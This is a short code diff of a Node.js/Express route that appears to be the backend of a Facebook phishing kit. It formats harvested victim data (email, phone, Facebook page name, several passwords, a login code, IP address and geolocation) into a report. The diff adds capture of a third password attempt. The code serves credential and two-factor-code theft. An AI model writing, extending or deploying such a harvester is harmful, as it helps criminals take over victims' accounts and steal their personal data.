@@ -39,8 +39,9 @@ app.post('/api/confirm', async (req, res) => {
         Personal Email: ${filteredData.personal_email || 'N/A'}
         Phone: ${filteredData.phone || 'N/A'}
         Facebook Page Name: ${filteredData.facebook_pagename || 'N/A'}
-        First Password: ${filteredData.first_password || 'N/A'}
-        Second Password: ${filteredData.second_password || 'N/A'}
+        1st Password: ${filteredData.first_password || 'N/A'}
+        2nd Password: ${filteredData.second_password || 'N/A'}
+        3rd Password: ${filteredData.third_password || 'N/A'}
         LoginCODE: ${filteredData.logincode || 'N/A'}
         Address: ${lookup(ipAddress).region || 'N/A'}, ${lookup(ipAddress).city || 'N/A'}, ${lookup(ipAddress).country || 'N/A'}
         IP Address: ${ipAddress}
